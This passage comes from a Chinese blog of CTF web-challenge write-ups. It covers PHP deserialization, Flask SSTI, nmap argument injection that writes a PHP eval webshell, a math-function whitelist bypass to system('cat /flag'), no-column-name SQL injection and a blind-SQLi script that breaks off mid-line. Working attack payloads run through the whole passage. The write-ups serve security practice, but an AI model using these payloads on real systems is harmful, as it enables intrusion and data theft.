Show();</span><br><span class="line">&#x2F;&#x2F; $b&#x3D; new Show();</span><br><span class="line">&#x2F;&#x2F; $a-&gt;source&#x3D;$b;</span><br><span class="line">&#x2F;&#x2F; $b-&gt;str&#x3D;new Test();</span><br><span class="line">&#x2F;&#x2F; ($b-&gt;str)-&gt;p&#x3D;new Modifier();</span><br><span class="line">&#x2F;&#x2F; echo &quot;\n&quot;;</span><br><span class="line">&#x2F;&#x2F; echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>但这里存在一个问题，为什么source一定得是Show，试了其他的都错了</p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>网页一进来一堆回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import flask </span><br><span class="line">import os </span><br><span class="line">app &#x3D; flask.Flask(__name__) </span><br><span class="line">app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;) </span><br><span class="line">@app.route(&#39;&#x2F;&#39;) </span><br><span class="line">def index(): </span><br><span class="line">	return open(__file__).read() </span><br><span class="line">@app.route(&#39;&#x2F;shrine&#x2F;&#39;) </span><br><span class="line">def shrine(shrine): </span><br><span class="line">	def safe_jinja(s): </span><br><span class="line">		s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;) </span><br><span class="line">		blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;] 			</span><br><span class="line">		return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s </span><br><span class="line">	return flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;: </span><br><span class="line">	app.run(debug&#x3D;True) </span><br></pre></td></tr></table></figure>

<p>关注一下最主要的是flask，可能是SSTI模板注入</p>
<p>发现一个shrine路由所以进入去试试</p>


<p>发现存在模板注入</p>
<p>但似乎存在关键词过滤</p>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果没有黑名单的时候，我们可以使用config，传入 config，或者使用self，传入 &#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line"></span><br><span class="line">当config,self,()都被过滤的时候，为了获取讯息，我们需要读取一些例如current_app这样的全局变量。</span><br><span class="line"></span><br><span class="line">看了其他师傅的WP，python的沙箱逃逸这里的方法是利用python对象之间的引用关系来调用被禁用的函数对象。</span><br><span class="line"></span><br><span class="line">这里有两个函数包含了current_app全局变量，url_for和get_flashed_messages</span><br></pre></td></tr></table></figure>

<p>利用<code>&#123;&#123;url_for.__globals__&#125;&#125;</code></p>


<p>找到一个current_app</p>
<p>利用其</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125; HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>这个标题让我想起来了一题也是nmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-oG xxx.php</span><br><span class="line">nmap上传文件的命令</span><br><span class="line"></span><br><span class="line">?host&#x3D;&#39; &lt;?php echo &#96;cat &#x2F;flag&#96;;?&gt; -oG test.php &#39;</span><br><span class="line">修改为一句话木马</span><br><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]) ?&gt; -oG test.php&#39;</span><br></pre></td></tr></table></figure>



<p>存在过滤，无法直接传入，修改一下后缀试试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host&#x3D;&#39; &lt;?&#x3D; @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</span><br></pre></td></tr></table></figure>

<p>传入显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Host maybe down</span><br></pre></td></tr></table></figure>

<p>加入一个IP，并用管道符连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host&#x3D;127.0.0.1 | &#39; &lt;?&#x3D; @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</span><br></pre></td></tr></table></figure>

<p>写入成功，尝试访问</p>


<p>蚁剑连接，在/目录下找到flag</p>
<p>我们可以看看Nmap的其他用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-iL 读取文件内容，以文件内容作为搜索目标</span><br><span class="line">-o 输出到文件</span><br></pre></td></tr></table></figure>

<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用数学式子来换算成命令执行</p>
<p>我们首先看看如果使用字符我们要怎么执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">知识点是php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat&#x2F;flag’);</span><br><span class="line">$a&#x3D;&#39;system&#39;;</span><br><span class="line">$a(&#39;cat&#x2F;flag&#39;);</span><br><span class="line"></span><br><span class="line">?c&#x3D;($_GET[a])($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</span><br><span class="line">将a,b换成白名单的内容</span><br><span class="line">?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br><span class="line">此时要解决两个问题</span><br><span class="line">1._GET如何绕过白名单</span><br><span class="line">2.怎么解决])和[(黑名单</span><br><span class="line"></span><br><span class="line">解决第一个问题我们可以利用进制转化来完成</span><br><span class="line">_GET先化为16进制，但没有hex2bin,那么还得用别的方法来</span><br><span class="line">base_convert函数</span><br><span class="line">返回一个字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line"></span><br><span class="line">第二个问题</span><br><span class="line">[]可以用&#123;&#125;来代替</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)结果是hex2bin</span><br><span class="line"></span><br><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;20175211lyz&#x2F;p&#x2F;11588219.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_50589021&#x2F;article&#x2F;details&#x2F;117648446</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>点击购买后在线扫面二维码显示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">拜托！你不会真的想PY到flag吧，这样可是违规的！再好好分析一下界面代码吧</span><br></pre></td></tr></table></figure>

<p>发现好像没什么主要看到的是路径试试可以直接访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node4.buuoj.cn:27435&#x2F;img&#x2F;code.png</span><br></pre></td></tr></table></figure>

<p>先看看主页面里面还有一个输入授权码</p>
<p>无论怎么输出都是你的授权码不正确</p>
<p>那就再分析下网页元素代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function enc(code)&#123;</span><br><span class="line">  hash &#x3D; hex_md5(code);</span><br><span class="line">  return hash;</span><br><span class="line">&#125;</span><br><span class="line">function validate()&#123;</span><br><span class="line">  var code &#x3D; document.getElementById(&quot;vcode&quot;).value;</span><br><span class="line">  if (code !&#x3D; &quot;&quot;)&#123;</span><br><span class="line">    if(hex_md5(code) &#x3D;&#x3D; &quot;0cd4da0223c0b280829dc3ea458d655c&quot;)&#123;</span><br><span class="line">      alert(&quot;您通过了验证！&quot;);</span><br><span class="line">      window.location &#x3D; &quot;.&#x2F;flag.php&quot;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      alert(&quot;你的授权码不正确！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    alert(&quot;请输入授权码&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入新页面</p>
<p>这句话就离谱</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我已经把购买者的IP保存了，显然你没有购买</span><br></pre></td></tr></table></figure>

<p>直接启动XFF头</p>


<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>没发现啥，抓包发现一个Cookie</p>


<p>发现还是没什么用，在前端代码中找到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;time.php?source</span><br></pre></td></tr></table></figure>

<p>进入获得源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;date&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a &#x3D; $this-&gt;a;</span><br><span class="line">        $b &#x3D; $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);</span><br></pre></td></tr></table></figure>

<p>反序列化，并且存在代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> echo $b($a);</span><br></pre></td></tr></table></figure>

<p>那么我们直接传入值就好了，$b是函数，$a是参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#error_reporting(0);</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a&#x3D;&quot;phpinfo()&quot;;</span><br><span class="line">    public $b&#x3D;&quot;system&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$o&#x3D; new HelloPhp();</span><br><span class="line">echo serialize($o);</span><br><span class="line"></span><br><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>但传入没效果，不应该先试试别的功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;.&quot;;s:1:&quot;b&quot;;s:7:&quot;scandir&quot;;&#125;</span><br><span class="line">回显Array那么应该是过滤了system</span><br><span class="line">exec也被过滤了</span><br><span class="line">利用assert来尝试</span><br><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br><span class="line">成功</span><br></pre></td></tr></table></figure>

<h3 id="TIPS-5"><a href="#TIPS-5" class="headerlink" title="TIPS"></a>TIPS</h3><p>找到phpinfo先试试直接找flag{</p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>进来是个登录框，初步测试了下没反应，试试注册</p>
<p>注册也测试了注入没反应，注册一个账号进去</p>


<p>看到发布广告，先试试XSS</p>
<p>发现存在XSS在广告内容中</p>
<p>但无从下手，看了其他是师傅发现这是个注入</p>
<p>点击广告详细后会有个参数id</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;8d013b67-d792-4ba4-ba0d-08d7b9cc5fa2.node4.buuoj.cn:81&#x2F;detail.php?id&#x3D;2</span><br></pre></td></tr></table></figure>

<p>但直接改id好像不行，那这个id应该就是在前面申请广告的时候注入的，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from xxx where name&#x3D;广告名</span><br></pre></td></tr></table></figure>



<p>应该是存在注入测试下那个是敏感词</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or</span><br><span class="line">#本来想用--+替换的测试了下直接--+也是敏感词</span><br></pre></td></tr></table></figure>

<p>or不能用就很伤，并且发现传入的内容空格直接被替换了</p>


<p>使用/**/来替换空格，如果注释符不行就直接用单引号将后续闭合</p>
<h3 id="TIPS-6"><a href="#TIPS-6" class="headerlink" title="TIPS"></a>TIPS</h3><p>无列名注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 mysql &#x3D;&gt; 5 的版本中存在库information_schema</span><br></pre></td></tr></table></figure>

<p>那么先测试一下列的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;4,&#39;</span><br></pre></td></tr></table></figure>

<p>发现没有回显增大数目</p>
<p>22没报错，23报错</p>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</span><br></pre></td></tr></table></figure>

<p>测试一下位置，我们构造的结果放在2，3</p>
<p>这里使用mysql的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats和sys.schema_table_statistics_with_buffer可以看表名、数据库名，就是没有列名</span><br></pre></td></tr></table></figure>

<p>查表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</span><br></pre></td></tr></table></figure>



<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;((select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;b,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users))a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;	</span><br></pre></td></tr></table></figure>

<p>这里的原理是根据我们无列名注入，根据提取的信息创建一个新的表格，用as换了名称来进行查询</p>


<p>获取flag,发现flag字样在2的后面那我们看看第三列</p>
<p><img src="https://upload-images.jianshu.io/upload_images/20163356-3fc279ccfaf5e770.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/559/format/webp" alt="img"></p>
<p>可以用这幅图理解一下，我们获取2列的时候显示了flag，那么如果此时我们读取3的列就可以获取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;((select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users))a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;	</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>发现五个可以点击的按钮，提示给了第六个，修改id为6</p>


<p>发现id不同结果不同，想到了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^1</span><br></pre></td></tr></table></figure>

<p>布尔盲注，但之前的脚本用不了需要构造新的语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;9ed9944c-70b2-4f04-b901-4c3819e47378.node4.buuoj.cn:81&#x2F;search.php&quot;</span><br><span class="line"></span><br><span class="line"># 0^(ord(substr(database(),1,1))&gt;32)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getDatabase():</span><br><span class="line">    database_name &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        low &#x3D; 32</span><br><span class="line">        hight &#x3D; 127</span><br><span class="line">        mid &#x3D; (low+hight)&#x2F;&#x2F;2</span><br><span class="line">        while low &lt; hight:</span><br><span class="line">            params &#x3D; &#123;</span><br><span class="line">                &quot;id&quot;: &quot;0^(ord(substr((select(database())),&quot;+str(x)+&quot;,1))&gt;&quot;+str(mid)+&quot;)&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">            if &quot;others~~~&quot; in r.text:</span><br><span class="line">                low &#x3D; mid+1</span><br><span class="line">            else:</span><br><span class="line">                hight &#x3D; mid</span><br><span class="line">            mid &#x3D; (low+hight)&#x2F;&#x2F;2</span><br><span class="line">        if low &lt;&#x3D; 32 or hight &gt;&#x3D; 127:</span><br><span class="line">            break</span><br><span class="line">        database_name +&#x3D; chr(mid)</span><br><span class="line">        print(&quot;数据库为：&quot;, database_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getTable():  # 获取表名</span><br><span class="line">    tables_name &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        left &#x3D; 32</span><br><span class="line">        right &#x3D; 127</span><br><span class="line">        mid &#x3D; (left+right)&#x2F;&#x2F;2</span><br><span class="line">        while left &lt; right:</span><br><span class="line">            params &#x3D; &#123;</span><br><span class="line">                &quot;id&quot;: 